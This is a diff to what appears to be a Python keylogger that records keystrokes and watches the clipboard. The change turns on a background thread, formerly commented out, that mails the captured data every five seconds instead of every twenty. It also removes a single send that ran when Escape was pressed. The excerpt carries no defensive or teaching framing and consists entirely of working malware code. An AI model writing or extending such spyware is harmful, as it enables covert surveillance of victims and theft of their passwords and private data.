@@ -13,7 +13,6 @@ ThreadRunning = True
 def on_press(key):
     global ThreadRunning
     if key == keyboard.Key.esc:
-        sendEmail()
         print("escape")
         ThreadRunning = False
         return False  
@@ -49,12 +48,12 @@ def checkClipBoard():
         time.sleep(1)
     
 
-# def sendToEmail():
+def sendToEmail():
 
-#     while ThreadRunning:
-#         sendEmail()
-#         time.sleep(20)
-#     return
+    while ThreadRunning:
+        sendEmail()
+        time.sleep(5)
+    return
 
 
 if __name__ == "__main__":
@@ -64,9 +63,9 @@ if __name__ == "__main__":
         checkClipBoardThread.daemon = True
         checkClipBoardThread.start()
 
-        # sendEmailThread = threading.Thread(target=sendToEmail)
-        # sendEmailThread.daemon = True
-        # sendEmailThread.start()
+        sendEmailThread = threading.Thread(target=sendToEmail)
+        sendEmailThread.daemon = True
+        sendEmailThread.start()
 
         listener.start() 
         listener.join()  
